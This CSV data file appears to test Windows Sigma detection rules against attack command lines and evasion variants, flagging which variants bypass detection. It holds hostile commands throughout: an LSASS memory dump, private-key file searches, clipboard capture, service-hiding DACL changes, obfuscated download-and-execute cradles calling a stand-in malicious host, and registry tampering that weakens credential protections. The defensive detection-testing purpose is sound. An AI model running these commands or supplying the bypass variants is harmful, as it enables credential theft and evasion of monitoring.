Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1552.004,proc_creation_win_powershell_getprocess_lsass,PowerShell Get-Process LSASS,b2815d0d-7481-4bf0-9b6c-a4c48a94b349,"cmd.exe /c ""powershell.exe -Command \""gps lsass | Out-Minidump\""""","powershell.exe -Command ""gps lsass | Out-Minidump""",TRUE,FALSE,FALSE,PowerShell Get-Process LSASS (b2815d0d-7481-4bf0-9b6c-a4c48a94b349); PowerShell Get-Process LSASS (b2815d0d-7481-4bf0-9b6c-a4c48a94b349); Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc); Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc)
t1552.004,proc_creation_win_powershell_getprocess_lsass,PowerShell Get-Process LSASS,b2815d0d-7481-4bf0-9b6c-a4c48a94b349,,"powershell.exe -Command ""Get-Process -Name lsass | Out-Minidump""",TRUE,TRUE,FALSE,Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc); Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc)
t1552.004,proc_creation_win_powershell_getprocess_lsass,PowerShell Get-Process LSASS,b2815d0d-7481-4bf0-9b6c-a4c48a94b349,"cmd.exe /c ""powershell.exe -Command \""Get-Process lsass | Out-Minidump\""""","powershell.exe -Command ""Get-Process lsass | Out-Minidump""",TRUE,FALSE,FALSE,PowerShell Get-Process LSASS (b2815d0d-7481-4bf0-9b6c-a4c48a94b349); PowerShell Get-Process LSASS (b2815d0d-7481-4bf0-9b6c-a4c48a94b349); Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc); Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc)
t1552.004,proc_creation_win_susp_private_keys_recon,Private Keys Reconnaissance Via CommandLine Tools,213d6a77-3d55-4ce8-ba74-fcfef741974e,cmd.exe /c dir c:\ /b /s .key | findstr /e .key,cmd.exe /c dir c:\ /b /s .key | findstr /e .key,TRUE,FALSE,FALSE,Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1552.004,proc_creation_win_susp_private_keys_recon,Private Keys Reconnaissance Via CommandLine Tools,213d6a77-3d55-4ce8-ba74-fcfef741974e,"cmd.exe /c dir c:\ /b /s .key | findstr "".key$""","cmd.exe /c dir c:\ /b /s .key | findstr "".key$""",TRUE,FALSE,FALSE,Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1552.004,proc_creation_win_susp_private_keys_recon,Private Keys Reconnaissance Via CommandLine Tools,213d6a77-3d55-4ce8-ba74-fcfef741974e,"cmd.exe /c dir c:\ /b /s .key | findstr /e "".key""","cmd.exe /c dir c:\ /b /s .key | findstr /e "".key""",TRUE,FALSE,FALSE,Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1552.004,proc_creation_win_susp_private_keys_recon,Private Keys Reconnaissance Via CommandLine Tools,213d6a77-3d55-4ce8-ba74-fcfef741974e,"powershell.exe  -Command \""Get-ChildItem -Path C:\ -Recurse -Include *.key\""","powershell.exe -Command ""Get-ChildItem -Path C:\ -Recurse -Include *.key""",TRUE,FALSE,FALSE,Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e)
t1552.004,proc_creation_win_susp_private_keys_recon,Private Keys Reconnaissance Via CommandLine Tools,213d6a77-3d55-4ce8-ba74-fcfef741974e,"powershell.exe  -c \""Get-ChildItem -Path C:\ -Recurse -Include *.key\""","powershell.exe -c ""Get-ChildItem -Path C:\ -Recurse -Include *.key""",TRUE,FALSE,FALSE,Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e)
t1552.004,proc_creation_win_susp_private_keys_recon,Private Keys Reconnaissance Via CommandLine Tools,213d6a77-3d55-4ce8-ba74-fcfef741974e,findstr  /e .key,findstr /e .key,TRUE,FALSE,FALSE,Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e)
t1552.004,proc_creation_win_susp_private_keys_recon,Private Keys Reconnaissance Via CommandLine Tools,213d6a77-3d55-4ce8-ba74-fcfef741974e,cmd.exe /c dir c:\ /b /s .pem | findstr /e .pem,cmd.exe /c dir c:\ /b /s .pem | findstr /e .pem,TRUE,FALSE,FALSE,Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1552.004,proc_creation_win_susp_private_keys_recon,Private Keys Reconnaissance Via CommandLine Tools,213d6a77-3d55-4ce8-ba74-fcfef741974e,"cmd.exe /c dir c:\ /b /s .pem | findstr "".pem$""","cmd.exe /c dir c:\ /b /s .pem | findstr "".pem$""",TRUE,FALSE,FALSE,Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1552.004,proc_creation_win_susp_private_keys_recon,Private Keys Reconnaissance Via CommandLine Tools,213d6a77-3d55-4ce8-ba74-fcfef741974e,"powershell.exe  -Command \""Get-ChildItem -Path C:\ -Recurse -Include *.pem\""","powershell.exe -Command ""Get-ChildItem -Path C:\ -Recurse -Include *.pem""",TRUE,FALSE,FALSE,Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e)
t1115,proc_creation_win_powershell_get_clipboard,PowerShell Get-Clipboard Cmdlet Via CLI,b9aeac14-2ffd-4ad3-b967-1354a4e628c3,"cmd.exe /c ""powershell.exe -Command \""Get-Clipboard\""""","powershell.exe -Command ""Get-Clipboard""",TRUE,FALSE,FALSE,PowerShell Get-Clipboard Cmdlet Via CLI (b9aeac14-2ffd-4ad3-b967-1354a4e628c3); PowerShell Get-Clipboard Cmdlet Via CLI (b9aeac14-2ffd-4ad3-b967-1354a4e628c3)
t1115,proc_creation_win_powershell_get_clipboard,PowerShell Get-Clipboard Cmdlet Via CLI,b9aeac14-2ffd-4ad3-b967-1354a4e628c3,"cmd.exe /c ""powershell.exe -Command \""Set-Alias gc-alt Get-Clipboard; gc-alt\""""","powershell.exe -Command ""Set-Alias gc-alt Get-Clipboard; gc-alt""",TRUE,FALSE,FALSE,PowerShell Get-Clipboard Cmdlet Via CLI (b9aeac14-2ffd-4ad3-b967-1354a4e628c3); PowerShell Get-Clipboard Cmdlet Via CLI (b9aeac14-2ffd-4ad3-b967-1354a4e628c3)
t1115,proc_creation_win_powershell_get_clipboard,PowerShell Get-Clipboard Cmdlet Via CLI,b9aeac14-2ffd-4ad3-b967-1354a4e628c3,,powershell.exe -EncodedCommand R2V0LUNsaXBib2FyZA==,TRUE,TRUE,FALSE,Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7)
t1115,proc_creation_win_powershell_get_clipboard,PowerShell Get-Clipboard Cmdlet Via CLI,b9aeac14-2ffd-4ad3-b967-1354a4e628c3,"cmd.exe /c ""powershell.exe -Command \""Get-Clipboard\"" -WindowStyle Hidden""","powershell.exe -Command ""Get-Clipboard"" -WindowStyle Hidden",TRUE,FALSE,FALSE,PowerShell Get-Clipboard Cmdlet Via CLI (b9aeac14-2ffd-4ad3-b967-1354a4e628c3); PowerShell Get-Clipboard Cmdlet Via CLI (b9aeac14-2ffd-4ad3-b967-1354a4e628c3)
t1115,proc_creation_win_powershell_get_clipboard,PowerShell Get-Clipboard Cmdlet Via CLI,b9aeac14-2ffd-4ad3-b967-1354a4e628c3,"cmd.exe /c ""powershell.exe -Command \""Get-Clipboard\"" -Command \""\""""","powershell.exe -Command ""Get-Clipboard"" -Command """"",TRUE,FALSE,FALSE,PowerShell Get-Clipboard Cmdlet Via CLI (b9aeac14-2ffd-4ad3-b967-1354a4e628c3); PowerShell Get-Clipboard Cmdlet Via CLI (b9aeac14-2ffd-4ad3-b967-1354a4e628c3)
t1115,proc_creation_win_powershell_get_clipboard,PowerShell Get-Clipboard Cmdlet Via CLI,b9aeac14-2ffd-4ad3-b967-1354a4e628c3,"cmd.exe /c ""powershell.exe -Command \""Get-Clipboard\"" -Command \""Write-Output 'Test'\""""","powershell.exe -Command ""Get-Clipboard"" -Command ""Write-Output 'Test'""",TRUE,FALSE,FALSE,PowerShell Get-Clipboard Cmdlet Via CLI (b9aeac14-2ffd-4ad3-b967-1354a4e628c3); PowerShell Get-Clipboard Cmdlet Via CLI (b9aeac14-2ffd-4ad3-b967-1354a4e628c3)
t1115,proc_creation_win_powershell_get_clipboard,PowerShell Get-Clipboard Cmdlet Via CLI,b9aeac14-2ffd-4ad3-b967-1354a4e628c3,"cmd.exe /c ""powershell.exe -Command \""Get-Clipboard\"" -Command \""Write-Output 'Test'\"" -Command \""\""""","powershell.exe -Command ""Get-Clipboard"" -Command ""Write-Output 'Test'"" -Command """"",TRUE,FALSE,FALSE,PowerShell Get-Clipboard Cmdlet Via CLI (b9aeac14-2ffd-4ad3-b967-1354a4e628c3); PowerShell Get-Clipboard Cmdlet Via CLI (b9aeac14-2ffd-4ad3-b967-1354a4e628c3)
t1574.011,proc_creation_win_sc_sdset_hide_sevices,Service DACL Abuse To Hide Services Via Sc.EXE,a537cfc3-4297-4789-92b5-345bfd845ad0,"sc  sdset AtomicService \""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\""","sc sdset AtomicService ""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)""",TRUE,FALSE,FALSE,Allow Service Access Using Security Descriptor Tampering Via Sc.EXE (6c8fbee5-dee8-49bc-851d-c3142d02aa47); Service DACL Abuse To Hide Services Via Sc.EXE (a537cfc3-4297-4789-92b5-345bfd845ad0); Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1574.011,proc_creation_win_sc_sdset_hide_sevices,Service DACL Abuse To Hide Services Via Sc.EXE,a537cfc3-4297-4789-92b5-345bfd845ad0,"sc.exe  sdset \""MyHiddenService\"" D:(D;;DCLCWPDTSD;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)","sc.exe sdset ""MyHiddenService"" D:(D;;DCLCWPDTSD;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)",TRUE,FALSE,FALSE,Allow Service Access Using Security Descriptor Tampering Via Sc.EXE (6c8fbee5-dee8-49bc-851d-c3142d02aa47); Service DACL Abuse To Hide Services Via Sc.EXE (a537cfc3-4297-4789-92b5-345bfd845ad0); Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1574.011,proc_creation_win_sc_sdset_hide_sevices,Service DACL Abuse To Hide Services Via Sc.EXE,a537cfc3-4297-4789-92b5-345bfd845ad0,,"sc.exe sdset ""MyHiddenService"" D:(D;;DC;;;IU)(D;;LC;;;IU)(D;;WP;;;IU)(D;;DT;;;IU)(D;;SD;;;IU)",TRUE,TRUE,FALSE,Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1574.011,proc_creation_win_sc_sdset_modification,Service Security Descriptor Tampering Via Sc.EXE,98c5aeef-32d5-492f-b174-64a691896d25,sc  sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD),sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD),TRUE,FALSE,FALSE,Allow Service Access Using Security Descriptor Tampering Via Sc.EXE (6c8fbee5-dee8-49bc-851d-c3142d02aa47); Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1574.011,proc_creation_win_sc_sdset_modification,Service Security Descriptor Tampering Via Sc.EXE,98c5aeef-32d5-492f-b174-64a691896d25,"sc  sdset AtomicService \""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\""","sc sdset AtomicService ""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)""",TRUE,FALSE,FALSE,Allow Service Access Using Security Descriptor Tampering Via Sc.EXE (6c8fbee5-dee8-49bc-851d-c3142d02aa47); Service DACL Abuse To Hide Services Via Sc.EXE (a537cfc3-4297-4789-92b5-345bfd845ad0); Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1574.011,proc_creation_win_sc_sdset_modification,Service Security Descriptor Tampering Via Sc.EXE,98c5aeef-32d5-492f-b174-64a691896d25,sc.exe  sdset scmanager D:(A;;KA;;;WD),sc.exe sdset scmanager D:(A;;KA;;;WD),TRUE,FALSE,FALSE,Allow Service Access Using Security Descriptor Tampering Via Sc.EXE (6c8fbee5-dee8-49bc-851d-c3142d02aa47); Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1027.009,proc_creation_win_powershell_token_obfuscation,Powershell Token Obfuscation - Process Creation,deb9b646-a508-44ee-b7c9-d8965921c6b6,,"powershell.exe -c ""&('In'+'voke-Ex'+'pression') (.('Ne'+'w-Ob'+'ject') Net.WebClient).DownloadString('http://malicious.local/payload')""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1027.009,proc_creation_win_powershell_token_obfuscation,Powershell Token Obfuscation - Process Creation,deb9b646-a508-44ee-b7c9-d8965921c6b6,,"powershell.exe -c ""&({0}{1}{2}{3}{4} -f 'In','voke-','Ex','pres','sion') (.({0}{1}{2} -f 'Ne','w-','Obje'+'ct') Net.WebClient).DownloadString('http://malicious.local/payload')""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1027.009,proc_creation_win_powershell_token_obfuscation,Powershell Token Obfuscation - Process Creation,deb9b646-a508-44ee-b7c9-d8965921c6b6,,"powershell.exe -c ""&('In'+'vOke-Expre'+'ssion') (.('Ne'+'w-Ob'+'ject') Net.WebClient).DownloadString('http://malicious.local/payload')""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1074.001,proc_creation_win_powershell_zip_compress,Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet,85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98 # Process Creation,"cmd.exe /c ""powershell.exe -Command \""Compress-Archive -Path 'C:\AtomicRedTeam\atomics\T1074.001\bin\Folder_to_zip' -DestinationPath $env:TEMP\Folder_to_zip.zip -Force\""""","powershell.exe -Command ""Compress-Archive -Path 'C:\AtomicRedTeam\atomics\T1074.001\bin\Folder_to_zip' -DestinationPath $env:TEMP\Folder_to_zip.zip -Force""",TRUE,FALSE,FALSE,Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet (85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98); Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet (85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98)
t1113,proc_creation_win_psr_capture_screenshots,Screen Capture Activity Via Psr.EXE,2158f96f-43c2-43cb-952a-ab4580f32382,psr.exe  -start /output C:\Users\Public\capture.zip /sc 1,psr.exe -start /output C:\Users\Public\capture.zip /sc 1,TRUE,FALSE,FALSE,Screen Capture Activity Via Psr.EXE (2158f96f-43c2-43cb-952a-ab4580f32382); Screen Capture Activity Via Psr.EXE (2158f96f-43c2-43cb-952a-ab4580f32382); Screen Capture Activity Via Psr.EXE (2158f96f-43c2-43cb-952a-ab4580f32382)
t1095,proc_creation_win_pua_netcat,PUA - Netcat Suspicious Execution,e31033fc-33f0-4020-9a16-faf9b31cbf08,"cmd.exe /c ""ncat.exe -l -v -p 4444""",ncat.exe -l -v -p 4444,TRUE,FALSE,FALSE,PUA - Netcat Suspicious Execution (e31033fc-33f0-4020-9a16-faf9b31cbf08); PUA - Netcat Suspicious Execution (e31033fc-33f0-4020-9a16-faf9b31cbf08)
t1112,proc_creation_win_reg_desktop_background_change,Potentially Suspicious Desktop Background Change Using Reg.EXE,8cbc9475-8d05-4e27-9c32-df960716c701,"reg  add \""HKCU\Control Panel\Desktop\"" /v Wallpaper /t REG_SZ /d \""C:\\ProgramData\\ransom.jpg\"" /f","reg add ""HKCU\Control Panel\Desktop"" /v Wallpaper /t REG_SZ /d ""C:\\ProgramData\\ransom.jpg"" /f",TRUE,FALSE,FALSE,Potentially Suspicious Desktop Background Change Using Reg.EXE (8cbc9475-8d05-4e27-9c32-df960716c701)
t1112,proc_creation_win_reg_import_from_suspicious_paths,Potential Suspicious Registry File Imported Via Reg.EXE,62e0298b-e994-4189-bc87-bc699aa62d97,reg.exe  import C:\Windows\Temp\payload.reg,reg.exe import C:\Windows\Temp\payload.reg,TRUE,FALSE,FALSE,Potential Suspicious Registry File Imported Via Reg.EXE (62e0298b-e994-4189-bc87-bc699aa62d97)
t1112,proc_creation_win_reg_import_from_suspicious_paths,Potential Suspicious Registry File Imported Via Reg.EXE,62e0298b-e994-4189-bc87-bc699aa62d97,reg  import C:\Users\User\AppData\Local\Temp\settings.reg,reg import C:\Users\User\AppData\Local\Temp\settings.reg,TRUE,FALSE,FALSE,Potential Suspicious Registry File Imported Via Reg.EXE (62e0298b-e994-4189-bc87-bc699aa62d97)
t1112,proc_creation_win_reg_import_from_suspicious_paths,Potential Suspicious Registry File Imported Via Reg.EXE,62e0298b-e994-4189-bc87-bc699aa62d97,"reg.exe   import  \""C:\ProgramData\malicious.reg\""","reg.exe  import  ""C:\ProgramData\malicious.reg""",TRUE,FALSE,FALSE,Potential Suspicious Registry File Imported Via Reg.EXE (62e0298b-e994-4189-bc87-bc699aa62d97)
t1112,proc_creation_win_reg_lsa_disable_restricted_admin,RestrictedAdminMode Registry Value Tampering - ProcCreation,28ac00d6-22d9-4a3c-927f-bbd770104573,"cmd.exe /c ""reg add \""HKLM\SYSTEM\CurrentControlSet\Control\Lsa\"" /v \""DisableRestrictedAdmin\"" /t REG_DWORD /d 0 /f""","reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""DisableRestrictedAdmin"" /t REG_DWORD /d 0 /f",TRUE,FALSE,FALSE,RestrictedAdminMode Registry Value Tampering - ProcCreation (28ac00d6-22d9-4a3c-927f-bbd770104573); RestrictedAdminMode Registry Value Tampering - ProcCreation (28ac00d6-22d9-4a3c-927f-bbd770104573)
t1112,proc_creation_win_reg_nolmhash,Enable LM Hash Storage - ProcCreation,98dedfdd-8333-49d4-9f23-d7018cccae53,"cmd.exe /c ""reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t REG_DWORD /d 0 /f""",reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t REG_DWORD /d 0 /f,TRUE,FALSE,FALSE,Enable LM Hash Storage - ProcCreation (98dedfdd-8333-49d4-9f23-d7018cccae53); Enable LM Hash Storage - ProcCreation (98dedfdd-8333-49d4-9f23-d7018cccae53)
t1112,proc_creation_win_reg_nolmhash,Enable LM Hash Storage - ProcCreation,98dedfdd-8333-49d4-9f23-d7018cccae53,"cmd.exe /c ""reg add \""HKLM\SYSTEM\CurrentControlSet\Control\Lsa\"" /v NoLMHash /t REG_DWORD /d 0 /f""","reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Lsa"" /v NoLMHash /t REG_DWORD /d 0 /f",TRUE,FALSE,FALSE,Enable LM Hash Storage - ProcCreation (98dedfdd-8333-49d4-9f23-d7018cccae53); Enable LM Hash Storage - ProcCreation (98dedfdd-8333-49d4-9f23-d7018cccae53)
t1112,proc_creation_win_reg_nolmhash,Enable LM Hash Storage - ProcCreation,98dedfdd-8333-49d4-9f23-d7018cccae53,"cmd.exe /c ""reg add \""HKLM\SYSTEM\CurrentControlSet\Control\Lsa\"" /v \""NoLMHash\"" /t REG_DWORD /d 0 /f""","reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""NoLMHash"" /t REG_DWORD /d 0 /f",TRUE,FALSE,FALSE,Enable LM Hash Storage - ProcCreation (98dedfdd-8333-49d4-9f23-d7018cccae53); Enable LM Hash Storage - ProcCreation (98dedfdd-8333-49d4-9f23-d7018cccae53)
t1112,proc_creation_win_reg_susp_paths,Reg Add Suspicious Paths,b7e2a8d4-74bb-4b78-adc9-3f92af2d4829,"reg  add \""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\\\"" /v Shell /t REG_SZ /d \""explorer.exe\"" /f","reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"" /v Shell /t REG_SZ /d ""explorer.exe"" /f",TRUE,FALSE,FALSE,Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829)
t1112,proc_creation_win_reg_susp_paths,Reg Add Suspicious Paths,b7e2a8d4-74bb-4b78-adc9-3f92af2d4829,,"reg.exe add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""LegitimateApp"" /t REG_SZ /d ""legit_app.exe"" /f",TRUE,TRUE,FALSE,Potential Persistence Attempt Via Run Keys Using Reg.EXE (de587dce-915e-4218-aac4-835ca6af6f70)
t1112,proc_creation_win_reg_susp_paths,Reg Add Suspicious Paths,b7e2a8d4-74bb-4b78-adc9-3f92af2d4829,"reg  add \""HKLM\SOFTWARE\Microsoft\Windows Defender\Features\"" /v \""TamperProtection\"" /t REG_DWORD /d 1 /f","reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 1 /f",TRUE,FALSE,FALSE,Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829)
t1112,proc_creation_win_reg_susp_paths,Reg Add Suspicious Paths,b7e2a8d4-74bb-4b78-adc9-3f92af2d4829,"reg  add \""HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE\"" /v \""BypassNRO\"" /t REG_DWORD /d 1 /f","reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE"" /v ""BypassNRO"" /t REG_DWORD /d 1 /f",TRUE,FALSE,FALSE,Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829)
t1112,proc_creation_win_reg_susp_paths,Reg Add Suspicious Paths,b7e2a8d4-74bb-4b78-adc9-3f92af2d4829,"reg  add \""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\\"" /v Shell /t REG_SZ /d \""explorer.exe\"" /f","reg add ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" /v Shell /t REG_SZ /d ""explorer.exe"" /f",TRUE,FALSE,FALSE,Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829)
t1112,proc_creation_win_regedit_import_keys,Imports Registry Key From a File,73bba97f-a82d-42ce-b315-9182e76c57b1,regedit.exe  /s\t malicious.reg,regedit.exe /s\t malicious.reg,TRUE,FALSE,FALSE,Imports Registry Key From a File (73bba97f-a82d-42ce-b315-9182e76c57b1)
t1112,proc_creation_win_regedit_import_keys,Imports Registry Key From a File,73bba97f-a82d-42ce-b315-9182e76c57b1,regedit.exe  /S .\malicious.reg,regedit.exe /S .\malicious.reg,TRUE,FALSE,FALSE,Imports Registry Key From a File (73bba97f-a82d-42ce-b315-9182e76c57b1)
